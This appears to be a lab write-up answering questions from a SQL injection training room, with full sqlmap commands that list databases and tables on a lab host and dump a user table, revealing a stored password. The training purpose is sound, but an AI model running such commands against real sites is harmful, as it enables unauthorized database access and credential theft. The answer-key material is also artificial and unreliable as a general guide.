Q1. Which language builds the interaction between a website and its database?
Ans: sql

Q2. Which boolean operator checks if at least one side of the operator is true for the condition to be true?Which boolean operator checks if at least one side of the operator is true for the condition to be true?
Ans: or

Q3. Is 1=1 in an SQL query always true? (YEA/NAY)
Ans: YEA

Q4. Which flag in the SQLMap tool is used to extract all the databases available?
Ans:--dbs

Q5. What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)
Ans:sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables

Q6. How many databases are available in this web application?
sqlmap "-u http://10.201.4.143/ai/includes/user_login?email=test&password=test" --dbs --level=5

<img width="949" height="470" alt="Screenshot 2025-08-05 232740" src="https://github.com/user-attachments/assets/d212d5f9-7608-4d36-b188-87c33c4188c5" />
Ans:6

Q7. What is the name of the table available in the "ai" database?
sqlmap "-u http://10.201.4.143/ai/includes/user_login?email=test&password=test" -D ai --tables --level=5
<img width="924" height="425" alt="Screenshot 2025-08-05 232730" src="https://github.com/user-attachments/assets/01bd7d39-cedf-46d9-b267-320228afb32c" />

Ans:user

Q8. What is the password of the email test@chatai.com?
sqlmap -u "http://10.201.4.143/ai/includes/user_login?email=test&password=test" -D ai -T user --dump --level=5
<img width="957" height="598" alt="Screenshot 2025-08-05 232939" src="https://github.com/user-attachments/assets/baf987fb-17ec-4b1c-93f9-6887404d4d20" />

Ans:12345678

